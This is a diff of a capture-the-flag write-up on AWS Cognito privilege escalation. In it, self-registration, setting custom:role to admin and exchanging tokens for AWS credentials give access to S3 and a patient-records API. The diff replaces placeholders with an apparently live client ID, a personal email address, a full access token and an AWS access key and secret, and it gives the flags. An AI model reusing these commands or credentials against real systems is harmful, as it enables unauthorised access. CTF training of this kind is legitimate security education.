@@ -12,8 +12,8 @@ The frontend validates email domains, but this can be bypassed by registering di
 
 ```bash
 aws cognito-idp sign-up \
-  --client-id 'CLIENT_ID' \
-  --username 'attacker@example.com' \
+  --client-id '7qmmadbiuvi0emiog8tnqddgf3' \
+  --username 'gerhinfosec@gmail.com' \
   --password 'SecurePass123!' \
   --user-attributes '[
     {"Name":"given_name","Value":"John"},
@@ -26,9 +26,9 @@ Verify the email address using the confirmation code:
 
 ```bash
 aws cognito-idp confirm-sign-up \
-  --client-id 'CLIENT_ID' \
-  --username 'attacker@example.com' \
-  --confirmation-code 'VERIFICATION_CODE'
+  --client-id '7qmmadbiuvi0emiog8tnqddgf3' \
+  --username 'gerhinfosec@gmail.com' \
+  --confirmation-code '371844'
 ```
 
 ### Step 4: Login and Extract Tokens
@@ -41,7 +41,7 @@ Update the custom role attribute to escalate privileges:
 
 ```bash
 aws cognito-idp update-user-attributes \
-  --access-token 'ACCESS_TOKEN' \
+  --access-token 'eyJraWQiOiIyUHhTbFFmSlZUMFJHWENjN1BjejdJT3ZuZDNIa3JuK0hiZGxyRHpQbDZrPSIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiJiNGU4MjQzOC0zMDYxLTcwZmItYjlmZC0yMmNlZjgwZDM5MWIiLCJpc3MiOiJodHRwczpcL1wvY29nbml0by1pZHAudXMtZWFzdC0xLmFtYXpvbmF3cy5jb21cL3VzLWVhc3QtMV8zTWFTejlZN2kiLCJjbGllbnRfaWQiOiI3cW1tYWRiaXV2aTBlbWlvZzh0bnFkZGdmMyIsIm9yaWdpbl9qdGkiOiJlYjVhM2MyZC1jMWI1LTQ2NGYtOTEyOS03OGU5OTNmOTYzM2UiLCJldmVudF9pZCI6ImFjMjMwYmUzLTM0YjMtNDUyNi1iOTYxLTExZDNhMzAyODljMiIsInRva2VuX3VzZSI6ImFjY2VzcyIsInNjb3BlIjoiYXdzLmNvZ25pdG8uc2lnbmluLnVzZXIuYWRtaW4iLCJhdXRoX3RpbWUiOjE3NTg3MzU0MjUsImV4cCI6MTc1ODczOTAyNSwiaWF0IjoxNzU4NzM1NDI1LCJqdGkiOiI0MGIwNTA4YS04NzM0LTRmOTMtODJmMy03Mzc5YTY4ZjlkNGYiLCJ1c2VybmFtZSI6ImI0ZTgyNDM4LTMwNjEtNzBmYi1iOWZkLTIyY2VmODBkMzkxYiJ9.HSjfIMWjrpcT3rn_QtzSWHURQ6A4AGmoUIfFzAJfzkK7Y-SCcnRo6aZq25b0X7VKNtWbWHSLVrzEFY4J5FJI_GViyPppUvsbFvOgouiIE09px8n7XQBckTz4lOtMc5Qldj5VRABFTwkCU5cm2bEc0gKqPXkKY-W1M-tqQExeYNGZyTPYHmDDN-XGOBYTrv7BQlaysNjUci_UZs84q26cUYILJPwDZVpiVUdrOH2L0diAj1Z1f9vUzcKHAnuRnvzMXo0YM-XFBb_2zQ7IRnM9tRZBWKDZf84HxMp2wVxKGDKblFlGB3Nj7nbyfbln2EGPJnAKmb2DYerpdjPrWjcccQ' \
   --user-attributes '[{"Name":"custom:role","Value":"admin"}]'
 ```
 
@@ -60,28 +60,72 @@ aws cognito-identity get-credentials-for-identity \
   --logins "cognito-idp.REGION.amazonaws.com/USER_POOL_ID=ID_TOKEN"
 ```
 
-### Step 7: Access the Flag
-Use the obtained AWS credentials to access the S3 bucket containing the flag:
+### Step 7: Access the S3 Bucket
+Use the obtained AWS credentials to access the S3 bucket:
 
 ```bash
-export AWS_ACCESS_KEY_ID="OBTAINED_ACCESS_KEY"
-export AWS_SECRET_ACCESS_KEY="OBTAINED_SECRET_KEY"
-export AWS_SESSION_TOKEN="OBTAINED_SESSION_TOKEN"
+export AWS_ACCESS_KEY_ID="ASIA5HCACCPUF77A6WUX"
+export AWS_SECRET_ACCESS_KEY="+0weZtMSEyiro1si6R/IBnd5W/U5eUSQRt/y5AHf"
+export AWS_SESSION_TOKEN="LONG_SESSION_TOKEN_HERE"
 
-aws s3 cp s3://FLAG_BUCKET_NAME/flag.txt ./flag.txt
-cat flag.txt
+# List the bucket contents
+aws s3 ls s3://ctf-25-cognito-flag-UNIQUE_ID/
+```
+
+### Step 8: Access the API Gateway Endpoint
+
+With the admin role privileges, you can also access the patient records API:
+
+```bash
+# Using the ID token with custom:role = admin
+curl 'https://API_GATEWAY_ID.execute-api.us-east-1.amazonaws.com/prod/patients' \
+  -H 'Authorization: Bearer YOUR_ID_TOKEN_WITH_ADMIN_ROLE'
+```
+
+### Step 9: Extract the Flag from API Response
+
+The API response contains patient records including one admin record with the flag:
+
+```json
+{
+  "success": true,
+  "data": [
+    /* ... other patient records ... */
+    {
+      "department": "administration",
+      "diagnosis": "System Maintenance",
+      "created_at": "2025-01-21T08:00:00Z",
+      "access_level": "admin_only",
+      "notes": "CTF{m3d1cl0udx_d4t4b4s3_4cc3ss_pr1v1l3g3_3sc4l4t10n}",
+      "status": "active",
+      "name": "System Administrator",
+      "patient_id": "ADMIN_SYS_007"
+    },
+    /* ... other patient records ... */
+  ],
+  "count": 10,
+  "message": "Retrieved patient records for MediCloudX Health System"
+}
+```
+
+### Step 10: Obtain the Flag
+
+The flag is found in the `notes` field of the admin patient record (`ADMIN_SYS_007`):
+
+```
+CTF{m3d1cl0udx_d4t4b4s3_4cc3ss_pr1v1l3g3_3sc4l4t10n}
 ```
 
 ## Key Learning Points
 
 1. **Client-side validation is insufficient**: Always implement server-side validation for security controls
 2. **Custom attributes security**: Carefully consider which attributes users can modify and implement proper authorization checks
-3. **Identity Pool role mapping**: Use fine-grained role mapping rules and avoid overly permissive configurations
-4. **Token exposure**: Sensitive tokens stored in browser storage can be extracted and misused
+3. **JWT attribute trust**: Never trust client-provided attributes without verification
+4. **Role mapping in Cognito**: Identity Pool role mapping based on custom attributes can lead to privilege escalation if not secured properly
 
 ## Flag
 
-`CTF{c0gn1t0_pr1v1l3g3_3sc4l4t10n_vuln3r4b1l1ty}`
+CTF{c0gn1t0_pr1v1l3g3_3sc4l4t10n_vuln3r4b1l1ty}
 
 ## Security Recommendations
 
